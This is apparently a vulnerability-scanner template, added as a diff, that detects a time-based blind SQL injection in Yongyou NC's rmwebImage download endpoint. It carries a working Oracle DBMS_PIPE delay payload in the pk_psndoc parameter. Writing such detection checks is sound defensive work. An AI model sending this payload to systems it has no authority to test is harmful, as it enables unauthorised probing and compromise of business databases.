@@ -1,0 +1,46 @@
+id: poc-yaml-yongyou-nc-rmwebimage-sqli
+info:
+  name: Yongyou NC rmwebImage SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in Yongyou NC `rmwebImage` functionality, leading to potential database compromise.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "YONYOU NC"
+        part: body
+
+  - raw:
+      - |
+        GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{t1}})-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "image/png"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
